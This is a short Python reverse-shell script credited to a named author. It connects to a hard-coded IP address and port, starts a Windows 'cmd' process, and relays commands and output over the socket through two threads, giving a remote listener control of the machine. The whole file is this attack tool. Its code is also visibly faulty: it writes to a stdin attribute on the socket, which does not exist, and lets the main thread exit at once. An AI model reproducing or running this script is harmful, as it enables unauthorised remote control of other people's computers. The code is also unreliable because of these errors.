#!/usr/bin/env python
#
#AUTHOR: IsmailVolodin
#VERSION: 1.0.0 [BETA]
#COUNTRY: Russian
#GITHUB: https://github.com/IsmailVolodin
#DISCORD: ismailvolodin_
#
#############
# LIBRARIES #
#############
import os
import time
import socket
import subprocess
import threading

def S2P(SOCKET, SHELL):
    while True:
        DATA = SOCKET.recv(4096)
         
        if len(DATA) > 0:
           SOCKET.stdin.write(DATA)
           SHELL.stdin.flush()

def P2S(SOCKET, SHELL):
    while True:
        SOCKET.send(SHELL.stdout.read(1))

SOCKET = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
SOCKET.connect(("172.20.191.89", 9001))

SHELL = subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

S2P_THREAD = threading.Thread(target=S2P, args=[SOCKET, SHELL])
S2P_THREAD.daemon = True
S2P_THREAD.start()

P2S_THREAD = threading.Thread(target=P2S, args=[SOCKET, SHELL])
P2S_THREAD.daemon = True
P2S_THREAD.start()